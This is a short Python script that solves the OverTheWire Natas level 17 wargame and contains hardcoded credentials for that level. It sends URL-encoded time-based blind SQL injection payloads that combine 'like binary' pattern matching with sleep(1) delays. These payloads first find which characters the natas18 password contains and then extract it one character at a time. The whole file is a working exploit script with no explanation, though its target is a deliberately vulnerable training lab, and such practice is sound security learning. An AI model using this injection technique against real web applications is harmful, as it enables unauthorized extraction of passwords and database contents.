import requests  
from requests.auth import HTTPBasicAuth  
  
Auth=HTTPBasicAuth('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')  
headers = {'content-type': 'application/x-www-form-urlencoded'}  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for char in allchars:  
    # payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%281%29+%23'.format(char)  
    payload = 'username=natas18%22%20and%20password%20like%20binary%20%27%25'+ char + '%25%27%20and%20sleep%281%29%20%23'
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
    if(r.elapsed.seconds >= 1):  
        filteredchars += char  
        print(filteredchars)  

for i in range(32):
    for char in filteredchars:
        payload = 'username=natas18%22%20and%20password%20like%20binary%20%27' + passwd + char + '%25%27%20and%20sleep%281%29%20%23'
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
        # print(passwd)
        if(r.elapsed.seconds >= 1):  
            passwd += char  
            print(passwd + '*' * (32-len(passwd))) 
